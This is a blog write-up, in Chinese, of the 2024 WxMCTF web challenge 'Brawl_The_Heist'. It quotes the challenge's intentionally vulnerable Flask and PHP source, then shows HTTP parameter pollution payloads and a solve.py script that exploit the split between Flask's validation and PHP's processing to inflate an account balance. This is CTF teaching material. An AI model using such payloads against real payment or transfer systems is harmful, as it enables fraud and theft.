---
date: '2026-04-06'
draft: false
title: "CTF_Brawl-The-Heist"
tags: ["CTF", "web"]
---
# Brawl_The_Heist

這次的題目是 2024 WxMCTF 的 Brawl_The_Heist

## Description
> After getting all of his brawlers to 500 trophies, Eatingfood has found himself in a pickle - there is a Fang on the opposing team every other match and he can no longer play the game! Luckily, he has a plan - to get enough gems to buy every brawler and hypercharge so he can get back to mindlessly mashing buttons and winning. Not wanting to wait and earn gems slowly by normal methods, he has resorted to some slightly more unethical means - uploading a virus into the Brawl Stars servers which would allow him to siphon gems from other players. However, the virus has an unexpected effect: it only allows him to transfer gems to other players. Can you find a way to get him enough gems so he can get back to mindlessly button mashing?

![image](/images/post-images/WxMCTF-1.png)

不知道為甚麼輸入框沒置中，強迫症看了好不舒服

Check Balance 畫面

![image](/images/post-images/WxMCTF-2.png)

## Solution
`account.json`
```json
{"LostCactus":1000,"Buddhathe18th":600,"aoeuhtns":400,"Eatingfood":1}
```
簡單來說就是預設帳號(Eatingfood)的各種資料

<details close><summary>app.py</summary>

```py=
import os
from flask import Flask, request, render_template, redirect
import requests
import json
app = Flask(__name__, static_url_path="/static")

flag = os.environ.get("FLAG")
# this is so scuffed .-.
os.system("apachectl start")

@app.route("/")
def send_money():
    response = requests.get("http://localhost:80/gateway.php").content
    accounts = json.loads(response)
    return render_template("send-money.html", data=accounts)

@app.route("/check-balance", methods=["GET"])
def check():
    response = requests.get("http://localhost:80/gateway.php").content
    accounts = json.loads(response)

    if (accounts["Eatingfood"] < 0):
        return render_template("check-balance.html", data=accounts, flag=":(")
    if (accounts["Eatingfood"] >= 100000):
        return render_template("check-balance.html", data=accounts, flag=flag)
    return render_template("check-balance.html", data=accounts)

@app.route("/send", methods=["POST"])
def send_data():
    raw_data = request.get_data()
    recipient = request.form.get("recipient");
    amount = request.form.get("amount");

    if (amount == None or (not amount.isdigit()) or int(amount) < 0 or recipient == None or recipient == "Eatingfood"):
        return redirect("https://media.tenor.com/UlIwB2YVcGwAAAAC/waah-waa.gif")
    
    # Send the data to the Apache PHP server
    raw_data = b"sender=Eatingfood&" + raw_data;
    requests.post("http://localhost:80/gateway.php", headers={"content-type": request.headers.get("content-type")}, data=raw_data)
    return redirect("/check-balance")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

``` 
</details>

要拿到 flag 的條件就是 Eatingfood >= 100000

<details close><summary>gateway.php</summary>

```php=
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $json = file_get_contents('accounts.json');
    $json_data = json_decode($json,true);

    $json_data[$_POST['recipient']] += $_POST['amount'];
    $json_data[$_POST['sender']] -= $_POST['amount'];
    
    file_put_contents('accounts.json', json_encode($json_data));
}

if ($_SERVER["REQUEST_METHOD"] === "GET") {
    echo file_get_contents('accounts.json');
}
?>
```

</details>

但接下來看 `gateway.php` 會發現如果 mount 輸入 100

後端 php 會處理 

```
Eatingfood -= 100
recipient += 100
```
代表 Eatingfood 把錢轉給 recipient(其他帳號)


解題方法有兩個都可行，基本邏輯是同樣的
### solve1

1. 這題的檢查機制在 `app.py` 34 行
    ```py
    if (amount == None or (not amount.isdigit()) or int(amount) < 0 or recipient == None or recipient == "Eatingfood"):
            return redirect("https://media.tenor.com/UlIwB2YVcGwAAAAC/waah-waa.gif")
    ```

    防止 amount 輸入非數字的資料或是小於 0，同時不能讓 recipient 為空或是轉帳給自己

    而在 `app.py` 38 行有
    ```py
    raw_data = b"sender=Eatingfood&" + raw_data;`
    ```
    直接把 `raw_data` 傳進 Apache，沒有重新 encode 或是過濾
    
2. Flask 在收資料的時候通常只拿第一個，但 PHP 拿的是最後一個

3. 在 `gateway.php` 第 7 行，會直接從 sender 帳戶扣錢，但沒有檢查帳戶是否存在、帳戶是否有錢等

4. 所以如果我們傳
    `recipient=AAA&amount=100000&recipient=Eatingfood&sender=penguin`

後端驗證邏輯會是

- Flask:
   - 驗證
        ```
        recipient = AAA
        amount = 100000
        ```
        通過驗證
  - 轉發
      ```
      sender=Eatingfood&
    recipient=AAA&
    amount=100000&
    recipient=Eatingfood&
    sender=penguin
      ```
    
- PHP 解析:
    - 收到的資訊
        ```
        recipient = Eatingfood
        sender = penguin
        amount = 100000
        ```
        
    - 執行
        ```
        Eatingfood += 100000
        penguin -= 100000
        ```
        
這樣 Eatingfood 就成功 >= 100000 了

### Solve2

第二個就比較單純，只是針對 Flask 和 PHP 解析順序的不同

所以如果送

`amount=100&recipient=Buddhathe18th&amount=-1000000`

Flask 會覺得 amount = 100，但 PHP 實際執行的是 -1000000

一樣可以拿到 flag

## solve.py

<details close><summary>solve.py</summary>

```
import requests

base_url = "http://localhost:5000"

payload1 = "recipient=AAA&amount=100000&recipient=Eatingfood&sender=ghost"

payload2 = "amount=100&recipient=Buddhathe18th&amount=-1000000"

def main():
    r1 = requests.post(
        f"{base_url}/send",
        data=payload2,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=True,
    )
    print("POST status:", r1.status_code)

    r2 = requests.get(f"{base_url}/check-balance")
    print(r2.text)

if __name__ == "__main__":
    main()

```

</details>


這邊採了個坑是 `headers={"Content-Type": "application/x-www-form-urlencoded"}`

`app.py` 31 行 
```py
recipient = request.form.get("recipient");
```

Flask 只會解析 x-www-form-urlencoded 或 multipart

在 `solve.py` 裡我們用的是 raw string，沒加 header 的話 Flask 會解析為空，造成錯誤

## Flag
![image](/images/post-images/WxMCTF-3.png)

<div class="flag-box">
<strong>
flag : wxmctf{dummy_flag}
</strong>
</div>